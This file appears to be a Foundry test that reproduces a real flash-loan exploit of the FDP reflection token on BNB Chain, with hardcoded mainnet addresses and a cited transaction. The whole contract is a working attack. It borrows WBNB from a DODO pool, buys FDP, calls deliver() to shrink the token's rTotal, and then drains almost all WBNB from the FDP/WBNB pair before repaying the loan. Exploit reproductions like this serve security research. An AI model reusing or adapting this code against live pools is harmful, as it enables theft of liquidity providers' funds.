// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./BaseTest.sol";

/*
 Tx hash: https://bscscan.com/tx/0x09925028ce5d6a54801d04ff8f39e79af6c24289e84b301ddcdb6adfa51e901b
*/

interface IFDP is IERC20 {
    function deliver(uint256 tAmount) external;
}

contract ExploitTest is BaseTest {
    IUniswapV2Router immutable router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 immutable WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IFDP immutable FDP = IFDP(0x1954b6bd198c29c3ecF2D6F6bc70A4D41eA1CC07);
    IUniswapV2Pair immutable FDP_WBNB = IUniswapV2Pair(0x6db8209C3583E7Cecb01d3025c472D1eDDBE49F3);
    IDPPOracle immutable dodo = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    
    uint256 immutable R_OWNED_SLOT = 1;
    uint256 immutable T_OWNED_SLOT = 2;
    uint256 immutable T_TOTAL_SLOT = 6;
    uint256 immutable R_TOTAL_SLOT = 7;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork("bsc", 25430418);
    }

    function testExploit() public {
        emit log_named_uint(
            "[INFO] FDP rTotal amount before exploit", getSlotUint(address(FDP), R_TOTAL_SLOT)
        );

        uint256 FLASHLOAN_WBNB_AMOUNT = 16.32 ether;
        dodo.flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), abi.encode(FLASHLOAN_WBNB_AMOUNT));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        uint256 FLASHLOAN_WBNB_AMOUNT = abi.decode(data, (uint256));

        WBNB.approve(address(router), type(uint256).max);
        FDP.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(FDP);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASHLOAN_WBNB_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp
        );

        emit log_named_decimal_uint(
            "[INFO] FDP amount in pair before deliver", FDP.balanceOf(address(FDP_WBNB)), 18
        );
        emit log_named_decimal_uint(
            "[INFO] FDP amount in attack contract before deliver", FDP.balanceOf(address(this)), 18
        );

        // Decrease rTotal
        FDP.deliver(28463.16 ether);

        emit log_named_uint(
            "[INFO] FDP rTotal amount after deliver", getSlotUint(address(FDP), R_TOTAL_SLOT)
        );

        emit log_named_decimal_uint(
            "[INFO] FDP amount in pair after deliver", FDP.balanceOf(address(FDP_WBNB)), 18
        );
        emit log_named_decimal_uint(
            "[INFO] FDP amount in attack contract after deliver", FDP.balanceOf(address(this)), 18
        );

        FDP_WBNB.swap(
            0,
            WBNB.balanceOf(address(FDP_WBNB)) - 0.15 ether,
            address(this),
            ""
        );

        // Repay flashloan
        WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);
    }
}